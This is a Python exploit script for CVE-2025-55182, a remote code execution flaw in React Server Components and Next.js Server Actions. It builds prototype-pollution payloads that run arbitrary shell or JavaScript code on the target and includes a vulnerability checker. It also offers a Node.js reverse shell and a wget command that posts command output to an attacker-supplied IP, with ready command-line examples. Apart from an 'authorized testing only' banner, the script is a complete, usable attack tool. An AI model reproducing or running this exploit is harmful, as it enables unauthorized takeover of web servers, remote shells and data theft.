#!/usr/bin/env python3
"""
CVE-2025-55182 - React Server Components RCE Exploit
Full Remote Code Execution against Next.js applications
⚠️  FOR AUTHORIZED SECURITY TESTING ONLY ⚠️
Affected versions:
- react-server-dom-webpack: 19.0.0 - 19.2.0
- Next.js: 15.x, 16.x (using App Router with Server Actions)
The vulnerability exploits prototype pollution in the Flight protocol
deserialization to achieve arbitrary code execution.
Credit: 
- Wiz for vuln discovery
- @maple3142 for first working poc
- @dez_ for this vibe poc
"""

import requests
import argparse
import sys
import base64


class CVE2025_55182_RCE:
    """Full RCE exploit for CVE-2025-55182"""
    
    def __init__(self, target_url: str, timeout: int = 15):
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
    
    def build_payload(self, command: str) -> dict:
        """
        Build the RCE payload that exploits prototype pollution.
        
        The payload creates a fake React chunk object that:
        1. Pollutes Object.prototype.then via "$1:__proto__:then"
        2. Sets _formData.get to Function constructor via "$1:constructor:constructor"
        3. Injects code via _prefix that gets passed to Function()
        """
        # Escape for JavaScript single-quoted string inside JSON double-quoted string
        # Order matters: backslashes first, then quotes
        escaped_cmd = (command
            .replace("\\", "\\\\")   # Escape backslashes
            .replace("'", "\\'")     # Escape single quotes for JS string
            .replace('"', '\\"')     # Escape double quotes for JSON context
        )
        
        # The malicious fake chunk structure
        payload_0 = (
            '{"then":"$1:__proto__:then",'
            '"status":"resolved_model",'
            '"reason":-1,'
            '"value":"{\\"then\\":\\"$B1337\\"}",'
            '"_response":{'
            '"_prefix":"process.mainModule.require(\'child_process\').execSync(\'' + escaped_cmd + '\');",'
            '"_chunks":"$Q2",'
            '"_formData":{"get":"$1:constructor:constructor"}'
            '}}'
        )
        
        return {
            '0': (None, payload_0),
            '1': (None, '"$@0"'),  # Reference to chunk 0
            '2': (None, '[]'),      # Empty array for chunks
        }
    
    def build_js_payload(self, js_code: str) -> dict:
        """
        Build payload with arbitrary JavaScript code (no shell escaping needed).
        
        This bypasses execSync entirely and runs pure JavaScript.
        Uses base64 encoding to avoid all JSON escaping issues.
        """
        # Base64 encode the JS code to avoid any escaping issues
        b64_code = base64.b64encode(js_code.encode()).decode()
        
        # Decode and eval on the target: eval(Buffer.from('...','base64').toString())
        wrapper = f"eval(Buffer.from('{b64_code}','base64').toString())"
        
        payload_0 = (
            '{"then":"$1:__proto__:then",'
            '"status":"resolved_model",'
            '"reason":-1,'
            '"value":"{\\"then\\":\\"$B1337\\"}",'
            '"_response":{'
            '"_prefix":"' + wrapper + '",'
            '"_chunks":"$Q2",'
            '"_formData":{"get":"$1:constructor:constructor"}'
            '}}'
        )
        
        return {
            '0': (None, payload_0),
            '1': (None, '"$@0"'),
            '2': (None, '[]'),
        }
    
    def execute(self, command: str) -> dict:
        """
        Execute arbitrary command on the target server.
        
        Args:
            command: Shell command to execute
            
        Returns:
            dict with success status and any output
        """
        print(f"[*] Target: {self.target_url}")
        print(f"[*] Command: {command}")
        
        headers = {
            'Accept': 'text/x-component',
            'Next-Action': 'x',  # Invalid action ID triggers vulnerable path
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
        }
        
        files = self.build_payload(command)
        
        result = {
            'success': False,
            'command': command,
            'target': self.target_url,
        }
        
        try:
            print(f"[*] Sending exploit payload...")
            resp = self.session.post(
                self.target_url, 
                headers=headers, 
                files=files, 
                timeout=self.timeout
            )
            result['status_code'] = resp.status_code
            result['response'] = resp.text[:500]
            
            # A 500 response often indicates the exploit worked
            # (the command runs but the response fails to serialize)
            if resp.status_code == 500:
                print(f"[+] Exploit sent successfully (status 500)")
                result['success'] = True
            else:
                print(f"[?] Unexpected status: {resp.status_code}")
                
        except requests.exceptions.Timeout:
            # Timeout is expected - the server hangs processing the payload
            print(f"[+] Request timed out (expected during RCE)")
            result['success'] = True
            result['timeout'] = True
            
        except Exception as e:
            print(f"[-] Error: {e}")
            result['error'] = str(e)
        
        return result
    
    def check_vulnerability(self) -> bool:
        """Quick check if target is vulnerable"""
        print(f"[*] Checking if {self.target_url} is vulnerable...")
        
        # First, verify the target is reachable
        try:
            print(f"[*] Verifying target is reachable...")
            resp = self.session.get(self.target_url, timeout=5)
            print(f"[+] Target reachable (status {resp.status_code})")
        except requests.exceptions.Timeout:
            print(f"[-] Target not reachable (timeout on GET)")
            return False
        except requests.exceptions.ConnectionError as e:
            print(f"[-] Target not reachable: {e}")
            return False
        
        headers = {
            'Accept': 'text/x-component',
            'Next-Action': 'x',
        }
        
        # Simple detection payload - triggers prototype chain access
        files = {
            '0': (None, '["$1:a:a"]'),
            '1': (None, '{}'),
        }
        
        try:
            print(f"[*] Sending detection payload...")
            resp = self.session.post(
                self.target_url, 
                headers=headers, 
                files=files, 
                timeout=5  # Short timeout - vulnerable servers may hang
            )
            
            if resp.status_code == 500 and 'E{"digest"' in resp.text:
                print(f"[+] Target appears VULNERABLE! (error response)")
                return True
            elif resp.status_code == 500:
                print(f"[+] Target likely VULNERABLE (status 500)")
                return True
            else:
                print(f"[-] Target may not be vulnerable (status {resp.status_code})")
                return False
        
        except requests.exceptions.Timeout:
            # Timeout after successful GET = server hung on payload = VULNERABLE
            print(f"[+] Target appears VULNERABLE! (server hung on payload)")
            return True
                
        except requests.exceptions.ConnectionError:
            # Connection reset could indicate crash = potentially vulnerable
            print(f"[?] Connection reset - target may be vulnerable (server crashed?)")
            return True
            
        except Exception as e:
            print(f"[-] Check failed: {e}")
            return False
    
    def reverse_shell(self, attacker_ip: str, attacker_port: int, windows: bool = None) -> dict:
        """
        Establish reverse shell using Node.js via execSync.
        
        Uses base64 encoding piped to node to avoid all escaping issues.
        Works on both Unix and Windows, auto-detects platform.
        
        Args:
            attacker_ip: IP address to connect back to
            attacker_port: Port to connect back to
            windows: If True, force cmd.exe; if False, force sh; if None, auto-detect
        """
        # Build the Node.js reverse shell code
        # Uses connection callback to ensure socket is ready before spawning
        if windows is None:
            # Auto-detect platform
            js_code = (
                f'var s=new(require("net").Socket);'
                f's.connect({attacker_port},"{attacker_ip}",function(){{'
                f'var sh=process.platform==="win32"?"cmd.exe":"sh";'
                f'var args=process.platform==="win32"?[]:["-i"];'
                f'require("child_process").spawn(sh,args,{{stdio:[s,s,s]}})'
                f'}})'
            )
            platform = "auto-detect"
        elif windows:
            js_code = (
                f'var s=new(require("net").Socket);'
                f's.connect({attacker_port},"{attacker_ip}",function(){{'
                f'require("child_process").spawn("cmd.exe",[],{{stdio:[s,s,s]}})'
                f'}})'
            )
            platform = "Windows (forced)"
        else:
            js_code = (
                f'var s=new(require("net").Socket);'
                f's.connect({attacker_port},"{attacker_ip}",function(){{'
                f'require("child_process").spawn("sh",["-i"],{{stdio:[s,s,s]}})'
                f'}})'
            )
            platform = "Unix/Linux (forced)"
        
        # Base64 encode and pipe to node - avoids all shell escaping issues
        b64_code = base64.b64encode(js_code.encode()).decode()
        command = f"echo {b64_code} | base64 -d | node"
        
        print(f"\n[!] Attempting reverse shell to {attacker_ip}:{attacker_port}")
        print(f"[!] Platform: {platform}")
        print(f"[!] Start listener: nc -lvnp {attacker_port}")
        
        return self.execute(command)
    
    def exfiltrate(self, command: str, attacker_ip: str, attacker_port: int) -> dict:
        """
        Execute command and send output to attacker via HTTP POST.
        
        Args:
            command: Command to execute
            attacker_ip: IP address to send output to
            attacker_port: Port to send output to
            
        Start a listener with: nc -lvnp PORT
        Output will arrive as HTTP POST body.
        """
        # Using wget to POST command output back
        exfil_cmd = f'wget --post-data="$({command})" http://{attacker_ip}:{attacker_port}/ -O- 2>/dev/null'
        
        print(f"\n[!] Executing: {command}")
        print(f"[!] Output will POST to {attacker_ip}:{attacker_port}")
        print(f"[!] Start listener: nc -lvnp {attacker_port}")
        
        return self.execute(exfil_cmd)


def main():
    parser = argparse.ArgumentParser(
        description='CVE-2025-55182 React Server Components RCE Exploit',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # Check if vulnerable
  python3 exploit_rce.py http://target:3000 --check
  
  # Execute command (blind)
  python3 exploit_rce.py http://target:3000 -c "id"
  
  # Execute command with output exfiltration
  python3 exploit_rce.py http://target:3000 --exfil "id" 10.0.0.1 4444
  
  # Reverse shell (pure Node.js, auto-detects Windows/Unix)
  python3 exploit_rce.py http://target:3000 --revshell 10.0.0.1 4444
  
  # Reverse shell - force Windows mode (cmd.exe)
  python3 exploit_rce.py http://target:3000 --revshell 10.0.0.1 4444 --windows
'''
    )
    
    parser.add_argument('target', help='Target URL (e.g., http://localhost:3000)')
    parser.add_argument('-c', '--command', help='Command to execute (blind)')
    parser.add_argument('--check', action='store_true', help='Check if vulnerable')
    parser.add_argument('--revshell', nargs=2, metavar=('IP', 'PORT'), 
                       help='Reverse shell to IP:PORT (uses Node.js by default)')
    parser.add_argument('--windows', action='store_true',
                       help='Force Windows payloads (cmd.exe). Default: auto-detect')
    parser.add_argument('--exfil', nargs=3, metavar=('CMD', 'IP', 'PORT'),
                       help='Execute CMD and POST output to IP:PORT')
    parser.add_argument('-t', '--timeout', type=int, default=15, 
                       help='Request timeout (default: 15)')
    
    args = parser.parse_args()
    
    if not any([args.check, args.command, args.revshell, args.exfil]):
        parser.print_help()
        print("\n[!] Specify --check, --command, --revshell, or --exfil")
        return 1
    
    exploit = CVE2025_55182_RCE(args.target, args.timeout)
    
    print("=" * 60)
    print("PoC")
    print("=" * 60)
    
    if args.check:
        return 0 if exploit.check_vulnerability() else 1
    
    if args.command:
        result = exploit.execute(args.command)
        return 0 if result.get('success') else 1
    
    if args.revshell:
        ip, port = args.revshell
        # windows=None means auto-detect, windows=True means force Windows
        windows_mode = True if args.windows else None
        result = exploit.reverse_shell(ip, int(port), windows=windows_mode)
        return 0 if result.get('success') else 1
    
    if args.exfil:
        cmd, ip, port = args.exfil
        result = exploit.exfiltrate(cmd, ip, int(port))
        return 0 if result.get('success') else 1
    
    return 0


if __name__ == '__main__':
    sys.exit(main())
